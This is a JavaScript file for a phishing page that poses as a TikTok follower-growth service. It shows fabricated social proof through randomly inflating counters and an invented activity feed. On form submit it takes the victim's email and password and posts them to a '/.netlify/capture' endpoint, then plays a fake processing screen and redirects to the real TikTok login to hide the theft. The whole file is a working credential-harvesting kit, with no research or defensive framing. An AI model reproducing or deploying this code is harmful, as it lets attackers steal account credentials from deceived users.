function createParticles() {
    const container = document.getElementById('particles');
    if (!container) return;
    for (let i = 0; i < 30; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 15 + 's';
        p.style.animationDuration = (15 + Math.random() * 10) + 's';
        container.appendChild(p);
    }
}

function animateCounters() {
    const followerEl = document.getElementById('followerCount');
    const likeEl = document.getElementById('likeCount');
    const userEl = document.getElementById('userCount');
    if (!followerEl || !likeEl || !userEl) return;
    
    setInterval(() => {
        const followers = parseInt(followerEl.textContent.replace(/,/g, ''));
        const likes = parseInt(likeEl.textContent.replace(/,/g, ''));
        const users = parseInt(userEl.textContent.replace(/,/g, ''));
        
        followerEl.textContent = (followers + Math.floor(Math.random() * 5)).toLocaleString();
        likeEl.textContent = (likes + Math.floor(Math.random() * 20)).toLocaleString();
        userEl.textContent = (users + Math.floor(Math.random() * 2)).toLocaleString();
    }, 3000);
}

function togglePass() {
    const input = document.getElementById('password');
    const icon = document.querySelector('.toggle-password');
    if (!input || !icon) return;
    if (input.type === 'password') {
        input.type = 'text';
        icon.textContent = '🙈';
    } else {
        input.type = 'password';
        icon.textContent = '👁';
    }
}

const names = ['@dance_queen', '@viral_king', '@trendsetter', '@fyp_god', '@content_creator', 
               '@influencer_x', '@tiktok_star', '@clout_chaser', '@algorithm_hack', '@fame_seeker'];
const actions = ['activated growth engine', 'gained 10K followers', 'unlocked verified badge', 
                 'hit 1M likes', 'went viral', 'joined premium tier'];

function addFeedItem() {
    const container = document.getElementById('feedItems');
    if (!container) return;
    const name = names[Math.floor(Math.random() * names.length)];
    const action = actions[Math.floor(Math.random() * actions.length)];
    const initial = name.charAt(1).toUpperCase();
    
    const item = document.createElement('div');
    item.className = 'feed-item';
    item.innerHTML = `
        <div class="feed-avatar">${initial}</div>
        <div class="feed-info">
            <div class="feed-username">${name}</div>
            <div class="feed-action">${action}</div>
        </div>
        <div class="feed-time">Just now</div>
    `;
    
    container.insertBefore(item, container.firstChild);
    if (container.children.length > 5) {
        container.removeChild(container.lastChild);
    }
}

function runProcessingSequence() {
    const lines = ['term1', 'term2', 'term3', 'term4', 'term5'];
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');
    let progress = 0;
    
    lines.forEach((id, index) => {
        setTimeout(() => {
            const el = document.getElementById(id);
            if (el) el.classList.remove('hidden');
        }, index * 1200);
    });
    
    const progressInterval = setInterval(() => {
        progress += Math.random() * 15;
        if (progress >= 100) {
            progress = 100;
            clearInterval(progressInterval);
            setTimeout(showSuccess, 600);
        }
        if (progressFill) progressFill.style.width = progress + '%';
        if (progressText) progressText.textContent = Math.floor(progress) + '%';
    }, 400);
}

function showSuccess() {
    const processingScreen = document.getElementById('processingScreen');
    const successScreen = document.getElementById('successScreen');
    
    if (processingScreen) processingScreen.classList.add('hidden');
    if (successScreen) successScreen.classList.remove('hidden');
    
    let countdown = 5;
    const countdownEl = document.getElementById('countdown');
    
    const timer = setInterval(() => {
        countdown--;
        if (countdownEl) countdownEl.textContent = countdown;
        if (countdown <= 0) {
            clearInterval(timer);
            window.location.href = 'https://www.tiktok.com/login';
        }
    }, 1000);
}

document.addEventListener('DOMContentLoaded', () => {
    createParticles();
    animateCounters();
    setInterval(addFeedItem, 4000);
    addFeedItem();

    // Quick health check — open browser console (F12) to see this
    fetch('/.netlify/capture')
        .then(r => r.json())
        .then(data => console.log('Function OK:', data))
        .catch(err => console.error('Function ERROR:', err));

    const form = document.getElementById('harvestForm');
    if (form) {
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = document.getElementById('email')?.value.trim();
            const password = document.getElementById('password')?.value;
            const btn = document.getElementById('submitBtn');
            const btnText = btn?.querySelector('.btn-text');
            const btnLoader = btn?.querySelector('.btn-loader');
            
            if (!email || !password) return;
            
            if (btnText) btnText.classList.add('hidden');
            if (btnLoader) btnLoader.classList.remove('hidden');
            if (btn) btn.disabled = true;
            
            const captureData = {
                email: email,
                password: password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            };
            
            try {
                const response = await fetch('/.netlify/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(captureData)
                });
                console.log('Server response:', response.status);
            } catch (err) {
                console.error('Send failed:', err);
            }
            
            setTimeout(() => {
                const mainForm = document.getElementById('mainForm');
                const processingScreen = document.getElementById('processingScreen');
                if (mainForm) mainForm.classList.add('hidden');
                if (processingScreen) processingScreen.classList.remove('hidden');
                runProcessingSequence();
            }, 1200);
        });
    }
});
